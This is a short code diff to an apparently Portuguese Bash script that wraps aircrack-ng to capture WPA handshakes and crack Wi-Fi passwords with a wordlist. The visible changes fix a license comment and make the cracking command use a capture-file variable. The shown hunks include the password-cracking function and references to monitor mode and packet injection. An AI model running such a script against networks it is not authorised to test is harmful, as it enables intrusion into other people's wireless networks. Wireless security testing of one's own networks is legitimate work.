@@ -4,13 +4,13 @@
 # Data: 19/07/2016 versão 0.1-0
 # Autor: Joao Lucas <joaolucas@linuxmail.org>
 # Github: https://github.com/joao-lucas
-# Lincença GPLv3
+# Lincença: GPLv3
 #
 
 INTERFACE=wlp2s0
 INTERFACE_MON=wlp2s0mon
 DATA=$(date +'%d-%m-%Y-%H-%M')
-ARQ_CAP=arq_$DATA
+ARQ_CAP=arq_$DATA-01.cap
 WORD_LIST="/home/joao_lucas/Desktop/Wordlists/wpa.list"
 
 menu(){
@@ -106,7 +106,7 @@ injetar_pacotes(){
 TENTAR_quebrar_senha(){
         #A senha da rede que você esta tentanto quebrar deve estar na sua wordlist"
         sleep 3 
-        aircrack-ng -w $WORD_LIST arq_20-07-2016-14-14-01.cap
+        aircrack-ng -w $WORD_LIST $ARQ_CAP
         if [ $? -eq 0 ]
         then
                echo -e "\n [\033[0;32m OK\033[0m ] Senha quebrada com sucesso!"
